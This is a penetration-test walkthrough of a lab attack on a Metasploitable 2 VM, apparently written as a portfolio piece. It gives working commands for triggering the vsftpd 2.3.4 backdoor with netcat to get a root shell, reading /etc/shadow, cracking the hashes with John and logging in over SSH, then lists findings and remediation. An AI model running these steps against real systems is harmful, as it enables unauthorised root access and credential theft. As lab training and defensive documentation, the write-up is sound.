# FULL-COMPROMISE-OF-METAPLOITABLE-2vsftpd-BACKDOOR-CREDENTIALS-CRACKING-AND-LATERAL-MOVEMENT.

 Metasploitable 2 — Full Compromise Walkthrough

From zero to root: chaining a legacy backdoor, offline credential cracking, and lateral movement against an intentionally vulnerable target.

Author: 0xLysis
Date: 6th October 2026
Environment: Isolated home lab (VirtualBox)
Target: Metasploitable 2 — 192.168.56.102
Attacker: Kali Linux — 192.168.56.101

---

📌 TL;DR

Phase Result
Recon 7+ services identified
Initial Access Root shell via vsftpd 2.3.4 backdoor
Credential Access /etc/shadow cracked with John
Lateral Movement SSH login as msfadmin
Final Impact Full system compromise

Time to root: under 10 minutes.

---

1. Executive Summary

A full penetration test was performed against a Metasploitable 2 host to simulate a real-world attack against an unpatched legacy server. The engagement achieved complete compromise — from unauthenticated remote code execution to valid user credentials to a working SSH foothold — without triggering any defensive controls.

The attack required no custom tooling. Every step used publicly available, industry-standard utilities (nmap, netcat, john, ssh). This demonstrates how quickly an outdated service with a known backdoor can lead to full environment compromise.

Risk rating: 🔴 Critical

---

2. Scope & Environment

Role Host IP
Attacker Kali Linux 192.168.56.101
Target Metasploitable 2 192.168.56.102

Network: isolated VirtualBox host-only network. No external systems affected.

---

3. Reconnaissance

```bash
nmap -sV -sC -p- 192.168.56.102
```

Services discovered:

Port Service Version Notes
21 FTP vsftpd 2.3.4 ⚠️ Known backdoor
22 SSH OpenSSH 4.7p1 Legacy crypto
80 HTTP Apache 2.2.8 EOL
139/445 SMB Samba 3.x Multiple CVEs
3306 MySQL 5.0.51a EOL
6667 IRC UnrealIRCd Backdoored build
8180 HTTP Apache Tomcat Default creds

Immediate red flag: vsftpd 2.3.4 — a version famously compromised with a malicious backdoor (CVE-2011-2523).

---

4. Initial Access — vsftpd 2.3.4 Backdoor

CVE-2011-2523 — The vsftpd 2.3.4 source tarball was trojanized. Sending a username ending in :) opens a root shell on port 6200.

Trigger the backdoor

```bash
nc 192.168.56.102 21
USER test:)
```

Catch the shell

```bash
nc -nv 192.168.56.102 6200
```

Verify access

```bash
whoami
# root
```

Result: Unauthenticated remote code execution as root. No exploit code required.

💡 The Metasploit module works too, but the manual nc method is more reliable — a known quirk of this legacy service.

---

5. Credential Harvesting & Cracking

With root access, the credential store was extracted:

```bash
cat /etc/passwd
cat /etc/shadow
```

Files transferred to Kali and merged:

```bash
unshadow passwd.txt shadow.txt > hashes.txt
john hashes.txt
john --show hashes.txt
```

Credentials recovered:

User Password Privilege
msfadmin msfadmin sudo
user user standard
service service standard

Weak hashing (MD5crypt) and default passwords made this trivial.

---

6. Lateral Movement — SSH Access

Kali's modern SSH client rejects Metasploitable's obsolete ssh-rsa algorithm. Fixed by enabling Wide Compatibility in kali-tweaks.

```bash
ssh msfadmin@192.168.56.102
```

Result: Interactive shell as a valid user — proving the cracked credentials are live and reusable across services.

---

7. Attack Chain

```
nmap scan
    │
    ▼
vsftpd 2.3.4 identified
    │
    ▼
Backdoor triggered → ROOT shell
    │
    ▼
/etc/shadow dumped → John → plaintext creds
    │
    ▼
SSH login as msfadmin → lateral movement
    │
    ▼
FULL COMPROMISE
```

---

8. Findings

# Finding Severity CVE
1 vsftpd 2.3.4 backdoor 🔴 Critical CVE-2011-2523
2 Weak password hashing (MD5crypt) 🟠 High —
3 Credential reuse across services 🟠 High —
4 End-of-life software (Apache, Samba, MySQL, Tomcat) 🟠 High Multiple

---

9. Remediation

1. Patch vsftpd immediately — or replace with a maintained FTP/SFTP solution.
2. Migrate to strong password hashing (bcrypt, argon2) and enforce complexity.
3. Eliminate credential reuse — unique credentials per service.
4. Disable legacy SSH algorithms; enforce key-based auth.
5. Decommission EOL software and apply a patch management cycle.
6. Network segmentation + monitoring to detect lateral movement.

---

10. Lessons Learned

· A single unpatched service can hand an attacker full control in minutes.
· Weak password storage turns a breach into a credential goldmine.
· Credential reuse transforms one compromised host into many.
· Modern tooling sometimes needs compatibility tweaks — knowing why matters more than knowing how.

---

🧰 Tools & Techniques Used

nmap · netcat · searchsploit · john the ripper · unshadow · ssh · kali-tweaks · CVE research · offline hash cracking · lateral movement

---

⚖️ Disclaimer

Performed in an isolated, self-hosted lab on an intentionally vulnerable VM. For educational and portfolio purposes only. No real systems were harmed.
